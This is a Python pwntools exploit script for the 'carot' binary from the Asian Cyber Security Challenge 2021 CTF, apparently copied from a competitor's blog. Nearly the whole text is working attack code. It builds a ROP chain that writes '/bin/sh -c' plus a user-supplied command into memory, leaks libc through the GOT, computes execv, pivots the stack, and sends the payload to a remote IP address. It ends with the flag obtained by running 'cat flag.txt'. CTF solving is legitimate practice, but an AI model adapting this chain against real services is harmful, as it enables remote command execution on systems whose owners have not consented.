# From https://blog.idiot.sg/2021-09-19/asian-cyber-security-challenge-2021/

#!/usr/bin/env python

from pwn import *

extra = "\n"
rdi = lambda x : p64(0x4010d3)+p64(x)
rsi = lambda x : p64(0x4010d1)+p64(x)*2
rbp = lambda x : p64(0x400828)+p64(x)
r15 = lambda x : p64(0x4010d2)+p64(x)
ret = lambda : p64(0x400829)

def arb_write(p, s):
    global extra
    # "%[^\n]" 0x4012F0
    rop = rdi(0x4012F0)
    rop+= rsi(p)
    rop+= p64(e.symbols["__isoc99_scanf"])
    rop+= p64(e.symbols["getchar"])
    extra += s+'\n'
    return rop

def arb_read_rax(p):
    rop = rbp(p+8)
    rop+= p64(0x400b7d)
    rop+= p64(0xdeadbeef)*3
    return rop

def arb_write_rax(p):
    rop = rbp(p+8)
    rop+= p64(0x400fd3)
    rop+= "\x00"*(0x260+8)
    return rop

def align(r):
    if (len(r)-536)%16:
        return r+ret()
    else:
        return r

def exploit(r):
    global extra

    cmd = sys.argv[1]
    mini_rop = rdi(0x602000)
    mini_rop+= rsi(0x602050)
    
    # Write strings
    rop = "GET ".ljust(536, '\x00')
    rop = align(rop)
    rop+= arb_write(0x602000, 
            "/bin/sh\x00-c\x00{}".format(cmd).ljust(0x50, '\x00')+
            p64(0x602000)+
            p64(0x602000+len("/bin/sh\x00"))+
            p64(0x602000+len("/bin/sh\x00-c\x00"))+
            p64(0)
    )
    rop = align(rop)
    rop+= arb_write(0x602f00, mini_rop)

    # Copy libc ptr from got
    rop+= arb_read_rax(e.got["__libc_start_main"])
    rop+= arb_write_rax(0x602f00+len(mini_rop))

    # subtract dword
    """
    0x0000000000400888 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret                     
    0x00000000004010ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;                    
    """
    rop+= p64(0x4010ca)
    rop+= p64(libc.symbols["execv"]-libc.symbols["__libc_start_main"])
    rop+= p64(0x602f00+0x3d+len(mini_rop))
    rop+= p64(0)*4
    rop+= p64(0x400888)

    # pivot
    """
    0x00000000004010cd: pop rsp; pop r13; pop r14; pop r15; ret;                             
    """
    rop+= p64(0x4010cd)
    rop+= p64(0x602f00-8*3)

    rop+= extra
    sleep(0.1)
    print(len(rop))
    r.sendline(rop)

    r.interactive()
    return

e = context.binary = ELF("./carot")
libc = ELF("./libc-2.31.so")
r = remote("35.189.142.38", 11451)
exploit(r)

# python exp.py "cat flag.txt"
# ACSC{buriburi_1d3dfb9bf7654412}